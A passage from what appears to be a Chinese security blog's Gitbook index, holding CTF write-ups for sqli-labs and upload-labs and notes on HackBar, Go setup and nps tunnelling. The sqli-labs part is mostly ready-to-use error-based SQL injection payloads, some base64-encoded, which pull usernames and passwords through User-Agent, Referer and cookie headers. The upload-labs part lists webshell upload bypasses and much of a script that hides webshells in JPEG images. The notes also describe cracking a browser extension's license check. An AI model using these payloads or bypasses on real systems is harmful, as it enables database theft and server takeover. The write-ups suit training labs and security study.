uname=admin&passwd=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\"users\"),0x7e)) # #get field data uname=admin&passwd=1' and extractvalue(1,concat(0x7e,(select * from (select group_concat(username,0x3a,password) from users) as a),0x7e)) # less-18 这一关是header头注入，User Agent头存在注入漏洞。这一关先要uname和passwd都正确后才会执行对User Agent的操作。uname和passwd都不能注入，他进行了严格的过滤。查看下他过滤的代码： function check_input($value) { if(!empty($value)) { // truncation (see comments) $value = substr($value,0,20); } // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) { $value = stripslashes($value); } // Quote if not a number if (!ctype_digit($value)) { $value = \"'\" . mysql_real_escape_string($value) . \"'\"; } else { $value = intval($value); } return $value; } $uname = check_input($_POST['uname']); $passwd = check_input($_POST['passwd']); get_magic_quotes_gpc函数的作用是获取php.ini中的magic_quotes_gpc的值。 当magic_quotes_gpc=On的时候，函数get_magic_quotes_gpc()就会返回1 当magic_quotes_gpc=Off的时候，函数get_magic_quotes_gpc()就会返回0 如果magic_quotes_gpc=On，PHP解析器就会自动为post、get、cookie过来的数据增加转义字符“\\”。 stripslashes函数用于去除字符串中的反斜杠\\ mysql_real_escape_string() 函数会转义 SQL 语句中使用的字符串中的特殊字符, 以下字符会受到影响: \\x00 \\n \\r \\ ' \" \\x1a 所以uname和passwd参数不能被注入 再看下User Agent被用于的mysql操作 $sql=\"SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\"; $result1 = mysql_query($sql); $row1 = mysql_fetch_array($result1); if($row1) { echo ''; $insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\"; mysql_query($insert); //echo 'Your IP ADDRESS is: ' .$IP; echo \"\"; //echo \"\"; echo ''; echo 'Your User Agent is: ' .$uagent; echo \"\"; echo \"\"; print_r(mysql_error()); echo \"\"; echo ''; echo \"\"; } else { echo ''; //echo \"Try again looser\"; print_r(mysql_error()); echo \"\"; echo \"\"; echo ''; echo \"\"; } } 它被用于insert语句中插入数据库，所以可以通过报错注入来获得数据库的内容 一般insert语句如下： insert into users (username, password) values ('$username','Olivia'); 要进行的注入的话就要闭合单引号，构造payload如下： username = \"1' or updatexml(1,database(),1) or'\" #最终SQL语句如下 insert into users (username, password) values ('1' or updatexml(1,database(),1) or'','test'); 在这一关中注入点是User Agent，我通过burpsuite来抓包修改 判断注入点： payload: #get database name User-Agent: 0' or updatexml(1,concat(0x7e,(database())),0) or' #get table name User-Agent: 0' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),0) or' #get column name User-Agent: 0' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\"users\"),0x7e),0) or' #get field data User-Agent: 0' or updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,10),0x7e),0) or' less-19 这一关是Refer头注入，登录成功后会将Refer头显示在网页上，并且会有报错回显 通过burpsuite抓包修改Refer头 注入点探测： Referer: ' Referer: ' or 1=1 or ' payload： #get database name Referer: ' or updatexml(1,concat(0x7e,database(),0x7e),1) or' #get table name Referer:' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),0) or' #get column name Referer:' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\"users\"),0x7e),0) or' #get field data Referer:' or updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,10),0x7e),0) or' less-20 这一关是cookie注入，通过admind登录后可以发现cookie的值是从uname中的到的。通过burpsuite抓包修改cookie进行测试 注入点探测： Cookie: uname=admin' Cookie: uname=admin'# payload: #database name Cookie: uname=admin' and updatexml(1,concat(0x7e,database(),0x7e),1) # #table name Cookie: uname=admin' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) # #column name Cookie: uname=admin' and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=\"users\"),1,10),0x7e),1) # #field data Cookie: uname=admin' and updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,10),0x7e),1) # less-21 这一关还是cookie注入，通过admin账户登录进去，可以发现cookie的值uname是一串经过base64编码的字符串，这里注入需要将注入的sql语句转为base64编码 注入点探测： #uname=admin' Cookie: uname=YWRtaW4n 通过报错信息可以发现cookie的值是由单引号加一个圆括号闭合的，所以需要将这两者闭合 payload: # admin') and updatexml(1,concat(0x7e,database(),0x7e),1)# uname=YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSwweDdlKSwxKSM= # admin') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)# uname=YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpKSwweDdlKSwxKSM= # admin') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\"users\"),0x7e),1)# uname=YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCBncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0idXNlcnMiKSwweDdlKSwxKSM= # admin') and updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,10),0x7e),1)# uname=YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2Usc3Vic3RyKChzZWxlY3QgZ3JvdXBfY29uY2F0KHVzZXJuYW1lLDB4M2EscGFzc3dvcmQpIGZyb20gdXNlcnMpLDEsMTApLDB4N2UpLDEpIw== less-22 这一关和上一关类似，都是cookie注入，cookie也是被base64编码了的，测试后这一关需要闭合双引号，payload和less-21类似 payload: # admin\" and updatexml(1,concat(0x7e,database(),0x7e),1)# uname=YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIw== # admin\" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)# uname=YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hPWRhdGFiYXNlKCkpLDB4N2UpLDEpIw== # admin\" and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\"users\"),0x7e),1)# uname=YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lPSJ1c2VycyIpLDB4N2UpLDEpIw== # admin\" and updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,10),0x7e),1)# uname=YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxzdWJzdHIoKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUsMHgzYSxwYXNzd29yZCkgZnJvbSB1c2VycyksMSwxMCksMHg3ZSksMSkj Stacked injections less-23 Copyright © Sec0zrc@gmail.com 2021 all right reserved，powered by Gitbook该文章修订时间： 2021-08-02 10:03:40 "},"CTFwriteup/upload_labs writeup.html":{"url":"CTFwriteup/upload_labs writeup.html","title":"upload_labs writeup","keywords":"","body":"upload_labs writeup 环境是windows，这里我用了他提供的集成环境，注意要修改apache的配置文件，因为他里面的路径和自己本地的不同，如果不修改的话apache会一直启动不来。 Pass-01 这一关是客户端使用js对上传的文件后缀名进行校验，通过抓包修改就可以上传了，也可以禁用浏览器的js。 [ Pass-02 抓包，修改Content-Type为image/gif Pass-03 利用windows操作系统特性，上传不符合wnidows文件命名规则的文件 shell.php%81 这里的%81需要在bp里进行urldecode 查了下，发现我的做法和别人的不一样….. 原来是我环境有点问题 正常做法应该是传扩展名为php3、phtml等来绕过黑名单 Pass-04 这一关也是一个个黑名单过滤，但是它的黑名单比上一关全很多，测试了一下，它基本把能过滤的都过滤了，但是它没有过滤.htaccess。 可以上传一个.htaccess文件，内容为： SetHandler application/x-httpd-php 然后上传一个图片马，成功连接。 这一关用上一关的思路也是可以的，构造不符合windows的文件后缀名 shell.php%81 ==> shell.php Pass-05 测试了一下，这一关也是黑名单过滤，它把.htaccess也过滤了。可以用后缀名大小写绕过。 Pass-06 扩展名后加空格绕过，或者加[%81-90]也可以绕过 shell.php[空格] shell.php[%81-90] Pass-07 扩展名后加.绕过 shell.php. Pass-08 利用windows文件流特性绕过 shell.php::$DATA Pass-09 后缀名加. .绕过，或者利用windows文件名特性绕过，后缀名加[%81-90] shell.php. . shell.php[%81-90] Pass-10 双写php绕过 shell.pphphp Pass-11 测试了一下，发现这个是白名单过滤，只允许上传.jpg|.png|.gif类型的文件 同时它文件保存的路径可以通过参数save_path控制，因为php版本小于5.3.4，存在%00截断问题。 控制save_path参数为../upload/shell.php%00，上传文件名为shell.jpg Pass-12 文件保存路径可控，这一关和上一关的区别是save_path是通过POST请求传递的，所以%00要先进行一遍url解码，因为POST请回会对数据进行url编码。 Pass-13 这一关要上传.jpg|.gif|.png的图片马上去，然后通过文件包含漏洞去运行图片马。它对文件头前两个字节进行了检测，通过文件头判断是否是.jpg|.gif|.png。 在一句话木马前加上对应的文件头，然后上传上去就ok了 .gif .jpg .png Pass-14 这一关也是上传图片马，它通过getimagesize()函数来检查图片类型。 getimagesize()函数通过检查文件头来判断文件类型，所以只要构造好文件头就可以了。 Pass-15 这一关使用了exif_imagetype函数来判断图像类型，这个函数通过读取 图像的第一个字节来判断图片类型。只要加上对应的文件头就可以绕过了，思路和前两关都一样。 Pass-16 这一关对上传的图片内容做了二次渲染。它将原本属于图片数据的部分提取了出来，再用自己的API或者函数进行渲染。通常php使用的是GD库，但是也可以绕过。基本方法是通过对比处理前和处理后的图片数据，找出没未经处理的数据区域，然后将代码插入。 gif 将上传后的文件下下来，用010editor打开，找到未被修改的区域将代码写入。 png 有两种方法，一种是将webshell写如PLTE数据块，另一种是写入IDAT数据块，具体制作方法参考这篇文章:http://0verflow.cn/?p=1502 jpg 用大佬写的脚本制作图片马 In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \"Something's wrong\". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $miniPayload = ''; if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) { die('php-gd is not installed'); } if(!isset($argv[1])) { die('php jpg_payload.php '); } set_error_handler(\"custom_error_handler\"); for($pad = 0; $pad readShort() != 0xFFD8) { die('Incorrect SOI marker'); } while((!$dis->eof()) && ($dis->readByte() == 0xFF)) { $marker = $dis->readByte(); $size = $dis->readShort() - 2; $dis->skip($size); if($marker === 0xDA) { $startPos = $dis->seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\"\\0\",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis->eof())) { if($dis->readByte() === 0xFF) { if($dis->readByte !== 0x00) { break; } } } $stopPos = $dis->seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\"\\0\",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage('payload_'.$argv[1], $outStream)) { die('Success!'); } else { break; } } } } unlink('payload_'.$argv[1]); die('Something\\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this->binData = ''; $this->order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this->binData = file_get_contents($filename); } else { $this->binData = $filename; } $this->size = strlen($this->binData); } public function seek() { return ($this->size - strlen($this->binData)); } public function skip($skip) { $this->binData = substr($this->binData, $skip); } public function readByte() { if($this->eof()) { die('End Of File'); } $byte = substr($this->binData, 0, 1); $this->binData = substr($this->binData, 1); return ord($byte); } public function readShort() { if(strlen($this->binData) binData, 0, 2); $this->binData = substr($this->binData, 2); if($this->order) { $short = (ord($short[1]) binData||(strlen($this->binData) === 0); } } ?> Pass-17 这一关提示我们源码审计，看了下他的源码发现存在条件竞争漏洞，它会先将上传的文件保存，然后再检查文件类型是否为jpg|png|gif中的一个，如果不是就会用unlink将文件删除。 $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); } }else{ $msg = '上传出错！'; } } 这里我通过bp的intruder模块来重复发包，先抓了一个访问shell.php的bao，然后设置好Payload type为Null Payloads，线程数为50 然后shell.php那个包我是用hackhttp这个库发送的 在跑脚本的同时运行intruder模块，返回状态码为200则说明成功访问到shell.php 本来我是想直接写另一个马到服务器的…但是我的win10虚拟不知道为什么报错，php代码如下： 这个打开文件流时会报错，路径问题…看的很迷，linux的环境我没搭，下次试试再试试这个。 Pass-18 嗯嗯嗯，不会，看网上大佬的writeup说是条件竞争绕过文件重命名然后配合apache解析漏洞 Pass-19 %00截断，保存的文件名可控 shell.php%00.jpg Pass-20 代码审计 $is_upload = false; $msg = null; if(!empty($_FILES['upload_file'])){ //检查MIME $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type)){ $msg = \"禁止上传该类型文件!\"; }else{ //检查文件名 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) { $file = explode('.', strtolower($file)); } $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) { $msg = \"禁止上传该后缀文件!\"; }else{ $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = \"文件上传成功！\"; $is_upload = true; } else { $msg = \"文件上传失败！\"; } } } }else{ $msg = \"请选择要上传的文件！\"; } 它先检查MIME类型是否为jpeg|png|gif中的一种，然后判断save_name是否为数组，如果不是就用explode函数将它切分为数组。接着判断文件扩展名的时用到end(save_name)，也就是数组的最后一个，但是保存文件名时 后缀名用的是$file[count($file) - 1]。这里绕过只要使end(save_name) != $file([count($file) - 1]) 就可以了，然后还有一个绕过点是move_uploaded_file函数会忽略文件名末尾的/. save_name[0] = shell.php/ save_name[2] = jpg Copyright © Sec0zrc@gmail.com 2021 all right reserved，powered by Gitbook该文章修订时间： 2021-06-04 16:39:00 "},"工具相关/":{"url":"工具相关/","title":"工具相关","keywords":"","body":"工具相关 这一部分会记录我常用工具的一些用法或是我折腾工具的一些历程 (简称踩坑之路) Copyright © Sec0zrc@gmail.com 2021 all right reserved，powered by Gitbook该文章修订时间： 2021-06-26 16:18:07 "},"工具相关/hackbar破解和踩坑之路.html":{"url":"工具相关/hackbar破解和踩坑之路.html","title":"hackbar破解和踩坑之路","keywords":"","body":"hackbar破解和踩坑之路 hackbar破解 作为一个倔强的白嫖怪(主要是没钱)，用到的工具都是基本都是破解版。 hackbar应该是web渗透的一个十分好用的插件，现在最新版本为2.31。它的用于检查license的代码比较简单，所以破解起来就比较简单，破解的具体步骤我参考了这篇文章Firefox-Hackbar-2.2.9-学习版 我就不在重复破解步骤了，主要是这个大佬破解的版本加上了他微信公众号的广告，我看着不是很喜欢，就自己动手把它给剁了，删除掉相关的html代码就可以了。 hackbar的bug 我在使用hackbar最新版是发现了个问题，如果post数据中包含submit=Submit这个字段的话，再点击Execute按钮时hackbar就不会发送请求。这个bug很奇怪，我曾经一度认为我是不是在破解时哪个地方删多了代码，导致这个问题，但显然不是。 打开firefox的插件调试功能，先按F12打开开发者工具，然后按F1打开设置，勾选上启用浏览器页面及附加组件的调试工具箱，然后就可以愉快的进行调试了 对hackbar进行测试，在post数据中加入submit=Submit字段，点击Execute按钮，这时候调试器就会捕获到hackbar抛出的一个异常，如下所示： 这个异常提示form.submit属性不是一个函数，通过控制台可以发现form.submit是form表单的一个元素，form原始的submit方法就会被覆盖，所以hackbar通过form.submit()来提交表单时就会抛出异常 这里看下hackbar对POST数据提交的代码： if(method === 'GET'){ let code = 'const url = \"'+ encodeURIComponent(url) +'\";'; code += 'window.location.href = decodeURIComponent(url);'; chrome.devtools.inspectedWindow.eval(code, function(result, isException){ setTimeout( () => { currentFocusField.focus() }, 100 ); }); }else{ let code = 'var post_data = \"' + encodeURIComponent(JSON.stringify(post_data)) + '\"; var url = \"' + encodeURIComponent(url) + '\";'; code+= 'var fields = JSON.parse(decodeURIComponent(post_data));'; code+= 'const form = document.createElement(\"form\");'; code+= 'form.setAttribute(\"method\", \"post\");'; code+= 'form.setAttribute(\"action\", decodeURIComponent(url));'; code+= 'fields.forEach(function(f) { var input = document.createElement(\"input\"); input.setAttribute(\"type\", \"hidden\"); input.setAttribute(\"name\", f[\\'name\\']); input.setAttribute(\"value\", f[\\'value\\']); form.appendChild(input); });'; code+= 'document.body.appendChild(form);' code+= 'form.submit();'; exec(code) } 它表单的提交是通过form.submit()方法来提交，这也不是不行，只要发送的post数据不带submit=Submit就可以正常发送了，但是我就是想带怎么办呢，将form.submit();改为HTMLFormElement.prototype.submit.call(form);就可以正常提交了。 后面的步骤就是将插件打包，上传到开发者中心获取签名等步骤 REFERENCE https://fengwenhua.top/index.php/archives/36/ https://trackjs.com/blog/when-form-submit-is-not-a-function/ Copyright © Sec0zrc@gmail.com 2021 all right reserved，powered by Gitbook该文章修订时间： 2021-06-26 15:58:19 "},"工具相关/Ubuntu18安装Go.html":{"url":"工具相关/Ubuntu18安装Go.html","title":"Ubuntu18安装使用Go","keywords":"","body":"Ubuntu18配置Go环境 安装go 获取最新的软件源包，并添加到当前的apt库中 add-apt-repository ppa:longsleep/golang-backports 安装go apt-get update apt-get install golang-go 检查go版本 go version 检查go的环境变量 go env 其中GOROOT是go语言安装的路径，GOPATH用于指定我们的开发工作区(workspace)，是存放源代码、测试文件、库静态文件、可执行文件的地方。按照Go开发规范，GOPATH目录下的每个工作一般分为三个子目录:src,pkg,bin，其中src目录放的是开发的源代码文件，其下面对应的目录称为包,pkg放的是编译后的库静态文件，bin放的是源代码编译后台的可执行文件。 这里我将GOPATH路径设置为/home/go-build，并且导入到环境变量PATH中 echo \"export GOPATH=/home/go-build\" >> ~/.profile echo \"export PATH=$PATH:$GOPATH/bin\" >> ~/.profile source ~/.profile 创建go-build目录及其子目录src bin pkg mkdir go-build chmod 777 go-build cd go-build mkdir src bin pkg chmod 777 src bin pkg 设置go代理 go有些包是下不了的....需要代理，这里设置go代理为https://goproxy.cn/ 执行下面的命令： echo \"export GO111MODULE=on\" >> ~/.profile echo \"export GOPROXY=https://goproxy.cn\" >> ~/.profile source ~/.profile Copyright © Sec0zrc@gmail.com 2021 all right reserved，powered by Gitbook该文章修订时间： 2021-07-01 15:54:27 "},"工具相关/内网穿透.html":{"url":"工具相关/内网穿透.html","title":"nps内网穿透","keywords":"","body":"内网穿透 前言 以前的笔记本闲置着感觉很可惜，所以将它装了个ubuntu18 Server，准备拿来当服务器。这里就来搞搞内网穿透，目的是在公网也能访问我的笔记本服务器 内网穿透简介 内网穿透，也即 NAT 穿透，进行 NAT 穿透是为了使具有某一个特定源 IP 地址和源端口号的数据包不被 NAT 设备屏蔽而正确路由到内网主机。下面就相互通信的主机在网络中与 NAT 设备的相对位置介绍内网穿透方法 ---from 百度百科 nps简介 这里我用到的工具是nps , nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端。 项目地址: nps 文档地址:nps文档 nps使用例子：nps example 主要看使用例子就可以了，基本功能全都覆盖到了 nps安装 快速安装 在公网的vps上安装nps server, 在内网的笔记本上装上nps client 将下载的压缩包解压到vps和内网笔记本上 服务端 以root权限运行 ./nps install 客户端 以root权限运行 ./npc install 自行编译 现在本地环境中配置好go编译环境 获取源码： go get -u ehang.io/nps 进入go源码目录下 服务端: go build cmd/nps/nps.go 客户端: go build cmd/npc/npc.go nps启动 服务端 以root权限运行 ./nps start 记得8080端口不要被占用了 ，访问http://IP:8080/就可以看到管理页面，用默认密码admin/123登录进去。默认密码在/etc/nps/conf路径下的nps.conf文件中修改 然后在管理界面添加一个客户端，其中的唯一验证密钥是客户端连接需要用到的 设置客户端的socket代理端口 客户端 无配置文件连接模式 连接vps命令如下： ./npc -server=ip:port -vkey=web界面显示密钥 这个样运行是没有注册到系统服务的，要注册到系统服务上才能开机自启，守护进程 注册：sudo ./npc install 其他参数（例如-server=xx -vkey=xx或者-config=xxx） 启动：sudo npc start 停止：sudo npc stop 如果需要更换命令内容需要先卸载./npc uninstall，再重新注册 nps使用 tcp隧道 目的：建立tcp隧道，用于远程ssh连接 在管理页面中的TCP隧道选项，新增一条tcp隧道，填写监听的端口（1024）、客户端id和目标端口（22），保存。 访问vps ip上的端口1024，相当于访问内网ip端口22 Copyright © Sec0zrc@gmail.com 2021 all right reserved，powered by Gitbook该文章修订时间： 2021-07-05 09:53:39 "}}